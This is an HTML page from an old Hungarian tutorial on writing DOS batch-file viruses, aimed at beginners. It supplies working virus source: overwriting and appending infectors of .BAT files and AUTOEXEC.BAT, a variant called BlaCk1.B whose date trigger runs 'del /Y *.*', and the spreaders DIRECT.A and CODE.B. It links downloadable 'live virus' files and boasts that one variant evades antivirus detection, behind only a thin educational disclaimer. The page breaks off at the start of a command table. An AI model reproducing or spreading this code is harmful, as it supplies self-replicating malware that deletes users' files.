<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=windows-1250">
<title>BATch virii k&eacute;sz&iacute;t&eacute;se</title>
<meta http-equiv="Content-Language" content="hu">
<meta name="generator" content="Microsoft FrontPage 4.0">
<style fprolloverstyle>A:hover {color: #FF0000; font-weight: bold}
</style>
<style type="text/css">
A:link          {text-decoration: none}
a:visited    { text-decoration: none; font-style: italic }
a:active     { color: #FF0000; font-style: italic; font-weight: bold }
a:hover      { text-decoration: underline; color: #FF0000; letter-spacing: 1pt }
</style>
<bgsound src="mission.mid" loop="-1">
</head>
<body background="bg2.gif" bgcolor="#FFFFFF" text="#000000" link="#0000FF" vlink="#800080"
 alink="#FF0000">

<p align="center"><font face="Comic Sans MS">BATch virii k&eacute;sz&iacute;t&eacute;se
- 1. r&eacute;sz</font></p>
<p align="center"><b><i><u>Let&ouml;lt&eacute;s sz&ouml;veges form&aacute;tumban
: </u></i></b><a href="batvwtut.txt"><b><i><u>BATVWTUT.TXT</u></i></b></a></p>
<p align="left"><font face="Comic Sans MS"><br>
A BAT v&iacute;rus a lehet&otilde; legegyszer&ucirc;bb a v&iacute;rusok k&ouml;z&uuml;l,
csak minim&aacute;lis programoz&oacute;i tud&aacute;s sz&uuml;ks&eacute;ges
hozz&aacute;, tal&aacute;n ez&eacute;rt rendk&iacute;v&uuml;l n&eacute;pszer&ucirc;
a kezd&otilde;k k&ouml;r&eacute;ben. A BAT v&iacute;rusoknak megvan az az el&otilde;ny&uuml;k,
hogy b&aacute;rmilyen, M$ (DOS, WIN3.1, WIN9X, WIN2000) oprendszeren &uacute;gy
futnak, hogy ihaj, ellent&eacute;tben a m&aacute;r kihal&oacute;f&eacute;lben
l&eacute;v&otilde; DOS-os v&iacute;rusokkal, melyek elbuknak a mai vind&oacute;zos
f&aacute;jlokon. A BAT v&iacute;rusok ezzel szemben korl&aacute;tlanul terjednek.
A BAT v&iacute;rust &iacute;r&oacute;nak egy dolgot kell a szeme el&otilde;tt
tartani. SZINTE MINDEN G&Eacute;PEN VAN LEGAL&Aacute;BB EGY BAT, AZ AUTOEXEC.BAT.
Ebben a fejezetben nem t&eacute;rn&eacute;k ki k&uuml;l&ouml;n a BATCH programoz&aacute;s
alapjaira, mert akkor nagyon hossz&uacute; lenne. Felt&eacute;telezem, hogy
rendelkezel bizonyos BAT-os alapismeretekkel. De tényleg csak egy kicsivel...
Úgy próbáltam ezt a tutorialt összehozni, hogy a legkezdõbb kezdõ is megértse...</font></p>
<p align="left"><font face="Comic Sans MS">Mielõtt bárki belekezd, felhívnám
a figyelmét, hogy csakis a saját felelõsségére. az itt található LETÖLTHETÕ
BAT vírusok, kizárólag tanító jellegûek. Nem vállalok semmiféle felelõsséget,
vagy egyebeket az itt leírtakkal kapcsolatban. A v_ -vel kezdõdõ letölthetõ
állományok ÉLÕ VÍRUSOKAT tartalmaznak, használatukért, vagy bármiféle károkozásért
szintén nem vállalok semmiféle felelõsséget. A pl_ kezdetû fájlok ártalmatlan
példaprogramokat tartalmaznak. Szóval jó tanulást, bármi gond, vagy probléma
esetén keressetek. A címem megtaláljátok <a href="#CIM">itt</a>. Ja, és kérlek
benneteket, tartózkodjatok, a hasonló jellegû levelektõl: Írj nekem egy vírust,
Vennék egy vírust, stb.&nbsp;<br>
Köszike :)<br>
Akkor v&aacute;gjunk bele:<br>
<br>
Milyen seg&eacute;dprogramok kellenek?<br>
B&aacute;rmilyen TEXT sz&ouml;vegszerkeszt&otilde; megteszi. DN, NC editor,
Wordpad, Jegyzett&ouml;mb, ilyesmik.<br>
Vagy, ha mondjuk 8086-os géped van, és még egy kis bigyó sem megy el rajta,
akkor használhatod a&nbsp;<br>
</font><font face="Courier">COPY CON filenév<br>
</font><font face="Comic Sans MS">parancsot is. Az is a BAT virii-k egyik jó
tulajdonsága. DOS3.0-tól felfele minden gépen elfutnak, fejlesztésükhöz
nincs szükség hatalmas progikra, sõt, a fordítással, és egyebekkel sem
kell foglalkozni. Minimális erõforrást fogyasztanak. Tehát kezdõknek rendkívül
ajánlott...<br>
<br>
A Batch nyelvet a M$ fejlesztette, &eacute;s haszn&aacute;lta. A BAT f&aacute;jl
egy olyan DOS script, melyhez v&eacute;geredm&eacute;nyben nem kell ford&iacute;t&oacute;program,
az utas&iacute;t&aacute;sok sorr&oacute;l sorra hajt&oacute;dnak v&eacute;gre,
egy egyszer&ucirc; TEXT form&aacute;tum&uacute; f&aacute;jlban. A BAT-ban haszn&aacute;lt
utas&iacute;t&aacute;sokat a COMMAND.COM &eacute;rtelmezi, teh&aacute;t felfoghatjuk
egy &uacute;n. realtime, vagy val&oacute;s idej&ucirc; ford&iacute;t&oacute;programnak
is, mely a programsorokat a g&eacute;p &aacute;ltal &eacute;rthet&otilde; nyelvre
ford&iacute;tja. Term&eacute;szetesen a BAT-b&oacute;l minden, a Command-line-on
vagy beviteli sorban v&eacute;grehajtott utas&iacute;t&aacute;s is elind&iacute;that&oacute;.
Ilyen esetben a BAT mint egy egyszer&ucirc; Command-line utas&iacute;t&aacute;ssor
viselkedik. A programoz&aacute;si, &eacute;s f&aacute;jlkezel&eacute;si, stb.
elemek term&eacute;szetesen keverhet&otilde;k. Program ind&iacute;t&aacute;s,
t&ouml;rl&eacute;s, &aacute;tnevez&eacute;s, formatt&aacute;l&aacute;s, d&aacute;tumfigyel&eacute;s,
stb.<br>
A Bat term&eacute;szet&eacute;b&otilde;l ad&oacute;d&oacute;an a &quot;programoz&oacute;&quot;
lehet&otilde;s&eacute;gei is korl&aacute;tozottak. Nem v&eacute;gezhet el bonyolult
mem&oacute;riakezel&eacute;si illetve v&aacute;ltoz&oacute;kat ig&eacute;nyl&otilde;
m&ucirc;veleteket, teh&aacute;t egy BAT v&iacute;rus MIND&Iacute;G realtime
(amikor elind&iacute;tj&aacute;k, csak akkor hajt&oacute;dik v&eacute;gre),
nem stealth (lopakod&oacute;), nem k&eacute;pes megszak&iacute;t&aacute;sokat
figyelni, vagy mag&aacute;ra &aacute;ll&iacute;tani, &iacute;gy pl. arra sem,
hogy egyszer&ucirc; m&aacute;sol&aacute;skor fert&otilde;zz&ouml;n. BAT v&iacute;rust
csak az &otilde;t tartalmaz&oacute; BAT elind&iacute;t&aacute;sakor aktiv&aacute;lhatunk.<br>
<br>
A legt&ouml;bb Batch virii nagyon egyszer&ucirc; m&oacute;dj&aacute;t haszn&aacute;lja
a terjed&eacute;snek. Egyszer&ucirc;en a </font><font face="Courier" size="2">%0</font><font
 face="Comic Sans MS"> (0. param&eacute;ter = aktu&aacute;lis f&aacute;jl el&eacute;r&eacute;si
&uacute;tja &eacute;s neve) seg&iacute;ts&eacute;g&eacute;vel saj&aacute;t mag&aacute;t,
vagyis 1 TELJES BAT-OT &aacute;tm&aacute;solnak a tal&aacute;lt bat tetej&eacute;be.
Vagyis fel&uuml;l&iacute;rj&aacute;k azt. ezt a copy paranccsal &eacute;rik
el.<br>
P&eacute;lda:</font></p>
<p align="left"><font face="Courier" size="2">Copy /Y %0 C:\Autoexec.bat &gt;nul</font></p>
<p align="left"><font face="Comic Sans MS">N&eacute;mi magyar&aacute;zat:<br>
A param&eacute;terek vizsg&aacute;lat&aacute;ra nem csak a </font><font face="Courier"
 size="2">%0</font><font face="Comic Sans MS">, de a </font><font face="Courier"
 size="2">%1</font><font face="Comic Sans MS">, </font><font face="Courier" size="2">%2</font><font
 face="Comic Sans MS">, stb. is haszn&aacute;lhat&oacute;, eg&eacute;szen 9-ig.
ezek a &quot;v&aacute;ltoz&oacute;k&quot; megh&iacute;v&aacute;sa a %-jel seg&iacute;ts&eacute;g&eacute;vel
t&ouml;rt&eacute;nik (ahogy a t&ouml;bbi&eacute; is). A </font><font face="Courier"
 size="2">%5</font><font face="Comic Sans MS"> teh&aacute;t visszaadja a BAT
5. param&eacute;ter&eacute;t. (Ha volt ilyen.)&nbsp;<br>
</font><font face="Courier" size="2">/Y</font><font face="Comic Sans MS"> nem
k&eacute;r beleegyez&eacute;st fel&uuml;l&iacute;r&aacute;skor. (m&eacute;g
sz&eacute;p)<br>
A </font><font face="Courier" size="2">&gt;nul</font><font face="Comic Sans MS">
a copy &uuml;zeneteit &quot;elhalgatja&quot;. Nincs kimenet a k&eacute;perny&otilde;n.
De nem csak a copy-t, hanem bármely más DOS-os program kimenetét átirányítja
a NUL eszközre, vagyis sehova. Ha a &gt; jel mellé filenevet írunk, akkor a képernyõn
megjelenõ üzenetek mind abba a fileba kerülnek. Pl.:&nbsp;<br>
</font><font face="Courier">ARJ /? &gt;arjhelp.txt<br>
</font><font face="Comic Sans MS">Ezzel a módszerrel remekül lehet, mondjuk
helpet listázni. Ha a &gt; jelet megfordítjuk: &lt; -ra, akkor az adatmozgás
pont fordítva fog megtörténni. Ha a DOS-os progi &quot;jól&quot; van megírva,
és használ paramétereket az un. DOS PROMPT-ból, v. COMMAND LINE-ból, akkor
a paramétereket egy fileból fogja kiolvasni. Ez nagyon hasznos hosszú paramétersorok
készítésekor, stb... Ha a &gt; jel helyett &gt;&gt; jelet használunk, a
kimeneti fájl, ha létezik, nem íródik felül, hanem hozzáfûzõdik.<br>
Most k&ouml;vetkezzen egy FEL&Uuml;L&Iacute;R&Oacute;S BAT V&Iacute;RUS, az
els&otilde; v&iacute;rusom, legal&aacute;bb is egy r&eacute;szlete, a motorja:
(Az Fprot Black.A-nak ismeri fel)<br></font></p>
<p align="left"><font face="Courier" size="2">@Echo OFF<br>
FOR %%f IN (*.BAT ../*.BAT) DO COPY %0 %%f &gt;nul</font></p>
<p align="left" style="page-break-before:always;"><font face="Comic Sans MS">Magyar&aacute;zat:<br>
</font><font face="Courier" size="2">@Echo off</font><font face="Comic Sans MS">
- kikapcsolja a f&aacute;jl sorainak megjelen&iacute;t&eacute;s&eacute;t. Ha
a sorok elej&eacute;re </font><font face="Courier" size="2">@</font><font face="Comic Sans MS">
jelet tesz&uuml;nk, akkor nem kell az </font><font face="Courier" size="2">ECHO</font><font
 face="Comic Sans MS">-t be&aacute;ll&iacute;tani, a sor semmik&eacute;ppen
nem fog megjelenni. Az </font><font face="Courier" size="2">echo</font><font
 face="Comic Sans MS">-t helyettes&iacute;thetj&uuml;k a </font><font face="Courier"
 size="2">CTTY NUL</font><font face="Comic Sans MS">-al is, sõt, ha a sor elejére
@ jelet teszünk, akkor az echo-t akár békén is hagyhatjuk, mert az így jelölt
sorok automatikusan nem kerülnek kiírásra. Az @ jelnek még más különleges
feladata is lesz, de errõl majd késõbb. Pl.:
</font></p>
<p align="left" style="page-break-before:always;"><font face="Courier">@ECHO
Csak a kiírás hajtódik végre, a parancssor nem látható<br>
</font><font face="Comic Sans MS">
<br>
Ilyen esetben a @ és az azt követõ parancs közé nem kell szünet. Sõt.
Tilos.<br>
</font><font face="Comic Sans MS">Annyit azért tisztázzunk, hogy a programozás
során magyar betûket kizárólag ECHO után lehet használni...<br>
 </font><font face="Courier" size="2"><br>
set</font><font face="Comic Sans MS"> -
Glob&aacute;lis v&aacute;ltoz&oacute; be&aacute;ll&iacute;t&aacute;sa. (Ha elfogyott
a k&ouml;rnyezeti be&aacute;ll&iacute;t&aacute;sokhoz sz&uuml;ks&eacute;ges
ter&uuml;let, akkor a BAT v&iacute;rosk nagy r&eacute;sze meg van l&otilde;ve.)
Pl.:<br>
<br>
</font> SET TEMP=C:\WINDOWS\TEMP&nbsp;<br>
<br>
<font face="Comic Sans MS">(ez a sor ált. minden autoexec-ben benne van.) Ezután
a C:\WINDOWS\TEMP könyvtárra hivatkozhatunk csak a TEMP szócskával, pl.:<br>
</font><br>
ECHO %TEMP%<br>
<br>
<font face="Comic Sans MS">Ez a sor megjeleníti a TEMP tartalmát, de ugyanezt
fájlokkal is eljátszhatjuk:<br>
</font><br>
 SET TEMP=C:\WINDOWS\TEMP&nbsp;<br>
SET MYFILE=C:\MYDIR\MYFILE.TXT&nbsp;<br>
ECHO %MYFILE%<br>
COPY /Y %MYFILE% %TEMP%<br>
<br>
<font face="Comic Sans MS">Ezek a paramcsok persze a COMMAND LINE-ban is mûködnek.
Ha bármelyik sort beírjuk, olyan, mintha egy BAT 1 sorát hajtanánk végre...<br>
</font><font face="Courier" size="2">for</font><font face="Comic Sans MS"> -
Egy nagyon egyszer&ucirc;, &aacute;m rendk&iacute;v&uuml;l hat&aacute;sos parancs.
Minden, a () k&ouml;z&ouml;tt deklar&aacute;lt f&aacute;jl keres&eacute;se,
melynek eredm&eacute;ny&eacute;t a </font><font face="Courier" size="2">%%f</font><font
 face="Comic Sans MS">-be teszi. Ami a </font><font face="Courier" size="2">DO</font><font
 face="Comic Sans MS"> ut&aacute;n j&ouml;n, b&aacute;rmilyen utas&iacute;t&aacute;s
lehet, ami v&eacute;grehajt&oacute;dik a tal&aacute;lt f&aacute;jlokra.<br>
</font><font face="Courier" size="2">*.bat </font><font face="Comic Sans MS">-
aktu&aacute;lis alk&ouml;nyvt&aacute;rban.&nbsp;<br> </font><font face="Courier"
 size="2">../*.BAT</font><font face="Comic Sans MS"> - AUTOEXEC.BAT rulez! :)<br>
Mi a k&uuml;l&ouml;nbs&eacute;g a </font><font face="Courier" size="2">%%f</font><font
 face="Comic Sans MS"> &eacute;s</font><font face="Courier" size="2"> %%b</font><font
 face="Comic Sans MS"> k&ouml;z&ouml;tt?<br> A </font><font face="Courier" size="2">%%f</font><font
 face="Comic Sans MS"> haszn&aacute;lat&aacute;val a </font><font face="Courier"
 size="2">DO</font><font face="Comic Sans MS"> ut&aacute;ni sor minden tal&aacute;lt
f&aacute;jlra v&eacute;grehajt&oacute;dik. REALTIME<br> A </font><font face="Courier"
 size="2">%%b</font><font face="Comic Sans MS"> haszn&aacute;lat&aacute;val
a </font><font face="Courier" size="2">DO</font><font face="Comic Sans MS">
ut&aacute;ni sor csak akkor hajt&oacute;dik v&eacute;gre, mikor az el&otilde;z&otilde;
f&aacute;jlm&ucirc;velet befejez&otilde;d&ouml;tt.<br>
</font><font face="Courier" size="2">%%f</font><font face="Comic Sans MS"> -
Bat-okat keres, &eacute;s minden tal&aacute;latn&aacute;l a tal&aacute;lt BAT
neve beleker&uuml;l ebbe a &quot;v&aacute;ltoz&oacute;ba&quot;.<br>
Ha a változónk több mint egy betû, akkor a következõ képpen kell
hivatkoznunk rá:&nbsp;<br>
</font><font face="Courier">%változó%</font><font face="Comic Sans MS"> vagyis
százalékjelek közé kell zárni. Az egybetûsekre a </font><font face="Courier">%%betû</font><font face="Comic Sans MS">
formát használjuk.<br>
</font><font face="Courier" size="2">copy</font><font face="Comic Sans MS">...
nos, gondolom &eacute;rthet&otilde;<br>
<br>
N&eacute;n&aacute;ny &eacute;rdekes el&aacute;gaztat&aacute;s a </font><font
 face="Courier" size="2">DO</font><font face="Comic Sans MS"> ut&aacute;n (IF =
HA, program elágaztatás):<br>
Használat: IF [feltétel] [utasítás]<br>
</font><font face="Courier" size="2"><br>
IF %1 ECHO OK&nbsp;</font><font
 face="Comic Sans MS">-Ha van a f&aacute;jlnak param&eacute;tere, akkor hajtja
v&eacute;gre az </font><font face="Courier" size="2">ECHO</font><font face="Comic Sans MS">-t.</font></p>
<p align="left"><font face="Courier" size="2">IF EXIST %1 </font><font face="Comic Sans MS">vagy</font><font
 face="Courier" size="2"> IF EXIST %%f </font><font face="Comic Sans MS">vagy
stb...</font><font face="Courier" size="2">&nbsp;</font><font face="Comic Sans MS">-
Ha az EXIST ut&aacute;n megadott f&aacute;jl, (ami lehet v&aacute;ltoz&oacute;ban
%%-al jel&ouml;lve, vagy param&eacute;terben (%) vagy sim&aacute;n is) l&eacute;tezik</font></p>
<p align="left"><font face="Courier" size="2">IF NOT EXIST </font><font face="Comic Sans MS">-Az
EXIST tagad&aacute;sa. Ha a megadott f&aacute;jl nem l&eacute;tezik. A NOT sz&oacute;cska
minden eld&ouml;ntend&otilde; (boolean: igen/nem) parancs el&eacute; t&eacute;ve
&uacute;gy m&oacute;dos&iacute;t, hogy ha valami nem k&ouml;vetkezik be, akkor
hajt&oacute;dik v&eacute;gre az utas&iacute;t&aacute;s.<br>
<br>
A k&ouml;vetkez&otilde; 2 sorral, </font><font face="Courier" size="2">DEBUG</font><font
 face="Comic Sans MS">-olhatunk is:<br>
Letölthetõ: <a href="pl_debug.bat">pl_debug.bat</a></font></p>
<p align="left"><font face="Courier" size="2">@Echo OFF<br>
for %%f in (*.bat ../*.bat) do Echo %%f</font></p>
<p align="left"><font face="Comic Sans MS">Magyar&aacute;zat: A tal&aacute;lt
f&aacute;jlok ki&iacute;r&aacute;sa.<br>
<br>
K&eacute;szen is van az els&otilde; BAT v&iacute;rusunk. De be kell, hogy valljuk,
a fel&uuml;l&iacute;r&aacute;s nem egy eleg&aacute;ns megold&aacute;s. Hogyan
lehetne a v&iacute;rust r&aacute;venni a hozz&aacute;f&ucirc;z&eacute;sre? A
megold&aacute;s egyszer&ucirc;nek n&eacute;z ki.</font></p>
<p align="left"><font face="Courier" size="2">@Echo OFF<br>
FOR %%f IN (*.BAT ../*.BAT) DO COPY %0+%%f %%f&gt;nul</font></p>
<p align="left"><font face="Comic Sans MS">Vagyis: a v&iacute;rusunk &eacute;s
a tal&aacute;lt BAT &ouml;sszem&aacute;sol&aacute;sa. a sorrend tetsz&otilde;leges,
ebben az esetben a v&iacute;rus ker&uuml;l az els&otilde; helyre. Nade. Ez az
elj&aacute;r&aacute;s a teljes file-t &aacute;tm&aacute;solja, &iacute;gy a
k&ouml;vetkez&otilde; fert&otilde;z&eacute;sn&eacute;l m&aacute;r nem csak a
v&iacute;rus, de a fert&otilde;z&ouml;tt f&aacute;jl is m&aacute;sol&aacute;sra
ker&uuml;l. Pl.:<br>
Mondjuk ez van a fert&otilde;z&ouml;tt fileban a fert&otilde;z&eacute;s ut&aacute;n:</font></p>
<p align="left"><font face="Courier" size="2">@Echo OFF<br>
FOR %%f IN (*.BAT ../*.BAT) DO COPY %%f+%0 %%f&gt;nul<br>
Echo &Ouml;nty&ouml;mp&ouml;nty&ouml;m<br>
Echo.<br>
Echo P&ouml;nty&ouml;m&ouml;nty&ouml;m<br>
Echo.<br>
REM Ez az &eacute;n 1. BAT-om</font></p>
<p align="left"><font face="Comic Sans MS">A k&ouml;vetkez&otilde; fert&otilde;z&eacute;skor
a file m&aacute;r &iacute;gy n&eacute;z ki:</font></p>
<p align="left"><font face="Courier" size="2">@Echo OFF<br>
FOR %%f IN (*.BAT ../*.BAT) DO COPY %%f+%0 %%f&gt;nul<br>
copy /Y %0 +BlaCk1 BlaCk1<br>
Echo &Ouml;nty&ouml;mp&ouml;nty&ouml;m<br>
Echo.<br>
Echo P&ouml;nty&ouml;m&ouml;nty&ouml;m<br>
Echo.<br>
REM Ez az &eacute;n 1. BAT-om<br>
Echo.&nbsp;<br>
Echo ez m&aacute;r a 2. BAT-om.<br>
Rem Copyright nemcsin&aacute;loksemmit<br>
REM H&aacute;t ez bar&oacute;<br>
mem /a /c /p</font></p>
<p align="left"><font face="Comic Sans MS">Sz&oacute;val el&eacute;g kellemetlen.
Ezzel a fantasztikus elj&aacute;r&aacute;ssal hatalmas BAT f&aacute;jlokat k&eacute;sz&iacute;thet&uuml;nk.
Mivel a progi nem ellenõrzi, (nem tudja ellenõrizni), hogy a talált fájl már
fertõzött e vagy sem, így egy fájlt akárhányszor felülfertõzhet. ez
azonban növeli a terjedési sebességet (hozzáfûzésnél), mert a virii egy
BAT-ban többször is végrehajtódik, kivéve, ha nem tartalmaz olyan kódot,
mely megállítja a BAT futását. Ilyen utasítás pl.: az<br>
</font><font face="Courier">EXIT<br>
</font><font face="Comic Sans MS">Amit csak így &quot;simán&quot; kiadunk, és
a BAT-unk már meg is állt.</font></p>
<p align="left"><font face="Courier" size="2">FOR %%f IN (*.BAT ../*.BAT) DO
COPY %%i+%0 %%i&gt;nul</font></p>
<p align="left"><font face="Comic Sans MS">utas&iacute;t&aacute;st a k&ouml;vetkez&otilde;,
m&eacute;g a BAT-os &otilde;skorb&oacute;l sz&aacute;rmaz&oacute; 2 sorra is
kicser&eacute;lhetj&uuml;k, aminek a legnagyobb h&aacute;tr&aacute;ny az, amir&otilde;l
m&aacute;r sz&oacute;ltam, vagyis, ha elfogy a k&ouml;rnyezeti be&aacute;ll&iacute;t&aacute;sok
t&aacute;rol&aacute;s&aacute;hoz a mem (&eacute;rdemesebb a fentit haszn&aacute;lni):</font></p>
<p align="left"><font face="Courier" size="2">for %%f in (*.bat ../*.bat) do
set BlaCk=%%f<br> COPY BlaCk+%0 %%f&gt;nul</font></p>
<p align="left"><font face="Comic Sans MS">Most, hogy szinte mindent tudunk a
felülíró BAT-okról, most nézzük meg azokat, amelyek már ténylegesnek vírusnak
nevezhetõk. Ezek a nem felülíró, vagy más néven hozzáfûzõ, módosító
(batch appender) vírusok. A probléma most sem bonyolultabb mint az elõzõ
esetben... A lényeg az, hogy magunkat egy fájl végére, elejére, vagy belsejébe
másoljuk. Csak egy különbség van. A hordozó BAT ne kerüljön át az újonnan
fertõzött állományba. Hogy lehetne ezt megoldani? Nos, nagyon egyszerûen. Nézzük
meg a következõ forrást, ami mellesleg az elõbb említett BAT, felülírós
vírusom BLACK.ORIGINAL.B változata. (Minden próbálkozásom ellenére, az
FPROT mégis, mint BLACK.A ismeri fel... Szar ügy. :) ):</font></p>
<p align="left">  for %%f in (*.bat ..\*.bat) do set BlaCk1=%%f&nbsp;<br>
  find &quot;BlaCk1&quot; %0 &gt;&gt;%BlaCk1%<br>
<br>
<br>
<font face="Comic Sans MS">Mi az, ami elsõre feltûnik? Hát kinek mi. De nekem
az a bizonyos BlaCk1 szócska. Furcsa módon minden sorban ismétlõdik, és van
egy olyan utasítás, amivel eddig még nem találkoztunk, a find. A mechanizmus
nagyon egyszerû. A viriinknek, ha csak magát akarja átmásolni, ismernie kell
a saját sorait, ezt pedig CSAK úgy érhetjük el, ha a sorok valamiben
megegyeznek, úgy, hogy az a program futását ne zavarja. Tehát nincs más hátra,
mint bevezetni egy környezeti változót, mondjuk a BlaCk1-et. Fontos, hogy a
betûméret minden sorban stimmeljen. A memóriabeli problémákról már szóltam.
Tehát ha elfogy a környezeti beállításokhoz szükséges terület, akkor a
virii meg van lõve.</font><br>
<br>
FIND - <font face="Comic Sans MS">utasítás. Megnyitja az utána, a 2.paraméterben
megadott file-t, (%0 = aktuális fájl, amiben a virii van) ami lehet akár környezeti
változó is, (ezt ugye tisztáztuk.) és az elsõ paraméterben megadott szöveget,
un.: karakterláncot keresi benne, és a keresés eredményét egy globális változóba,
az ERRORLEVEL-be teszi, akárcsak az összes többi parancs. Ha az utolsó
parancs elvégzése sikeres volt, az ERRORLEVEL=0. Ha nem, akkor egy hibakód,
vagy 1, de mindenképpen nagyobb mint 0. A harmadik paraméter, a
&lt;&lt;%BlaCk1% azokat a sorokat, melyeknen a keresendõ karakterlánc megtalálható,&nbsp;
a %BlaCk1% fájlhoz fûzi (&lt; esetén felülírja). A FIND parancsról érdemes
helpet kérni, tanulmányozni, ugyanis a talált sorokat a képernyõn jeleníti
meg (magát a vírust), és csak ezen képernyõre történõ kiírást irányítjuk
át, a talált bat file-ra. A fenti esetben nem történik ellenõrzés azt
illetõen, hogy a file már fertõzött e. Nézzük ugyanezen forrás kicsit bõvített
változatát:</font><br>
<br>
for %%f in (*.bat ..\*.bat) do set BlaCk1=%%f&nbsp;<br>
  find &quot;BlaCk1&quot; %BlaCk1% &gt;nul<br>
  if errorlevel 1 find &quot;BlaCk1&quot;&lt;%0.BAT&gt;&gt;%BlaCk1%&nbsp;<br>
<br>
<font face="Comic Sans MS">Az ERRORLEVEL a FIND esetében akkor 1, ha a keresett
szöveg a fileban nem található. Hogy elkerüljük, hogy nem fertõzött fájlok
esetleg tartalmazzák a mi vírusunk NEVÉT, próbáljunk meg kis-, nagy betûkbõl,
számokból és egyéb karakterekbõl álló nevet kitalálni.<br>
Tehát, ha a vírusunk nincs benne a talált fájlban, akkor megfertõzzük,
SZINTÉN A FIND UTASÍTÁSSAL, tehát attól függõen, hogy a kimenetet hova irányítjuk,
a FIND utasítás nagyon fontos szerepet tölt be.</font></p>
<p align="left">IF ERRORLEVEL 1 - <font face="Comic Sans MS">Ha hiba volt, akkor
az 1-es után lévõ utasítás végrehajtódik.<br>
<br>
Tehát: a vírus minden sorának tartalmazni kell a &quot;nevét&quot;. Most lássunk
erre egy példát. Mondjuk a BlaCk2 variáns jó is lesz erre a célra. Külön
erre a célra készült, ha ráengedtek egy vírusírtót, az még nem ismeri. Még
azt sem mondja rá, hogy ismeretlen vírus. Különlegessége, hogy NEM írja felül az eredeti BLACK1.A-t, (Letölthetõ <a href="v_black1.bat">innen</a>) és
nem &quot;annyira&quot; destruktív. Aki a BLACK1.A-t szeretné tanulmányozni,
az várjon a következõ számig, különben kellemetlen meglepetésben lehet része,
mikor belenéz...Szóval a BLACK1.B:&nbsp;<br>
Letölthetõ: <a href="v_black2.bat">v_black2.bat</a><br>
<br>
</font><font face="Courier">@Echo OFF%[BlaCk1]%<br>
REM Less destructive version of (BlaCk1)! DOES NOT OVERWRITE OLD Black1.<br>
for %%f in (*.bat ..\*.bat) do set BlaCk1=%%f<br>
find "BlaCk1"&lt;%BlaCk1%>nul<br>
if errorlevel 1 find "BlaCk1"&lt;%0>>%BlaCk1%<br>
echo.|date|find "04.16"&lt;nul%[BlaCk1]%<br>
if errorlevel 0 goto :BlaCk1<br>
if errorlevel 1 goto :BlaCk1_KILL<br>
:BlaCk1_KILL<br>
Cls REM BlaCk1<br>
ECHO.Hello! I am the Black Death (BlaCk1) from Hungary! Just a moment...<br>
del /Y *.* [%BlaCk1%]<br>
Echo.Bang! Now you are death! (BlaCk1)<br>
:BlaCk1<br>
</font><font face="Comic Sans MS"><br>
Ez a virii, szinte minden eddig tanult dolgot magába foglal. Amirõl még nem
beszéltem, az a GOTO utasítás:<br>
Bármilyen BAt file belsejében van arra lehetõség, hogy bizonyos részeket átugorjunk,
tehát a sorok nem egymás után hajtódnak végre. A label-nek, v. címkének
nevezett valamiket a </font><font face="Courier">:NEV<br>
</font><font face="Comic Sans MS">utasítással hozhatjuk létre, minden külön
magyarázat nélkül (Csak angol betûk lehetnek a név-ben). Ha az utasítás végrehajtás
egy ilyen sorhoz ér, egyszerûen nem veszi figyelembe, mintha ott sem lenne Az
ilyen LABEL-eknek CSAK A GOTO utasítással van értelmük. Vagyis:<br>
</font><font face="Courier">GOTO :címke</font><font face="Comic Sans MS"><br>
formában. így a GOTO és a LABEL közti részt átugorja, és a label után következõ
sorban folytatódik a végrehajtás. Természetesen elõre, és hátra is
hivatkozhatunk. A következõ néhány sor végtelenítve írja a képernyõre,
hogy Black Cat! ( :) az a nyavajás ego...) (megszakítani CTRL+C -vel, vagy
CTRL+BRAKE):<br>
Letölthetõ: <a href="pl_bc.bat">pl_bc.bat</a>&nbsp;</font></p>
<p align="left"><font face="Courier">:INDUL<br>
@ECHO BLACK CAT<br>
@GOTO :INDUL</font></p>
<p align="left"><font face="Comic Sans MS">Ennyit a GOTO-ról. Nézzétek meg a
példákat, és minden érthetõvé válik.&nbsp;&nbsp;<br>
a fent felsorolt dolgok, tulajdonságok, utasítások, természetesen végtelenül
kombinálhatók. az adja meg a BAT virii egyediségét. Amit itt leírtam, az
csak egy lehetséges út. Még úgy is sokminden hátra van. Egy BAT virii többet
tud, mint azt mi gondolnánk, na de errõl késõbb.<br>
Akkor jöjjenek a példák:</font></p>
<hr>
<p align="left"><font face="Comic Sans MS">Vírusnév: DIRECT.A<br>
Letölthetõ: <a href="v_666.BAT">v_666.bat</a><br>
<br>
</font><font face="Courier">@echo off<br>
@set inf=n<br>
@set infect=n<br>
@if %INF%==Y goto scan<br>
@echo @SET INF=Y >a.666<br>
@echo @call %0.bat >>a.666<br>
@echo @echo Batch virus greets You !>>a.666<br>
@TYPE AUTOEXEC.BAT >>A.666<br>
@COPY A.666 AUTOEXEC.BAT >NUL<br>
@SET INF=Y<br>
:scan<br>
@IF %INFECT%==Y GOTO END<br>
@c:<br>
@cd\<br>
@dir %0.bat /s|find /i "Direct" >c:\a.666<br>
@echo exit >>c:\a.666<br>
@echo @copy %%2\%0.bat c:\ >c:\director.bat<br>
@command &lt;c:\a.666 >nul<br>
@c:<br>
@cd\<br>
@dir /ad /s|find /i "Direct" >a.666<br>
@echo exit >>a.666<br>
@echo @if not exist %%2%0.bat copy c:\%0.bat %%2 >c:\Director.bat<br>
@command &lt; a.666 >nul<br>
@del a.666<br>
@del director.bat<br>
@del %0.bat<br>
@SET INFECT=Y<br>
:END<br>
@echo Good command or file name!</font></p>
<hr>
<p align="left"><font face="Comic Sans MS">Vírusnév: CODE.B<br>
Letölthetõ: <a href="v_code.bat">v_code.bat<br>
</a><br>
</font><font face="Courier">@echo off%_CoDe%<br>
if '%1=='Inf goto CoDe_inf<br>
if exist c:\_CoDe.bat goto CoDe_ok<br>
if not exist %0.bat goto CoDe_out<br>
find "CoDe"&lt;%0.bat>c:\_CoDe.bat<br>
:CoDe_ok<br>
for %%a in (*.bat ..\*.bat) do call c:\_CoDe Inf %%a<br>
if errorlevel 1 echo [CoDe] the working one.<br>
goto CoDe_out<br>
:CoDe_inf<br>
find "CoDe"&lt;%2>nul<br>
if errorlevel 1 type c:\_CoDe.bat>>%2<br>
:CoDe_out</font></p>
<hr>
<p align="center"><a href="Fpreport.txt">FPROT REPORT</a></p>
<hr>
<p align="left"><font face="Comic Sans MS">Ennyit a példákról. Most, hogy már
elvileg sokat tudunk, nézzünk néhány egyszerû DOS utasítást, melyek színessé
tehetik BAT-os vírusunkat:&nbsp;<br>
</font></p>
<table border="1" width="100%">
  <tr>
    <td width="15%">
      <p align="center"><b>PARANCS</b></td>
